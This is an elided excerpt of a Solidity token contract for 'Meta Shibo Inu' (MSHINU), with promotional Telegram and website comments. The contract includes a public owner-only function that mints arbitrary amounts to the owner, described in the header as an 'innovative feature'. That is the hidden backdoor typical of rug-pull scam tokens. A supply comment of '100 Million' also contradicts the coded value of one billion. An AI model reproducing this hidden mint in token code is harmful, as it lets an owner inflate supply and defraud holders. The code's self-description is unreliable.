...
//
// $MetaShiboInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ShiboInuBSC
// 📱 Website :: https://shibo-inu.meta/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaShiboInu(uint256 amount) public onlyOwner {
 _MetaShiboInu(msg.sender, amount);
    }
    ...
    function _MetaShiboInu(address account, uint256 amount) internal virtual {
...
contract $MetaShiboInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Shibo Inu", "MSHINU") {
     _MetaShiboInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}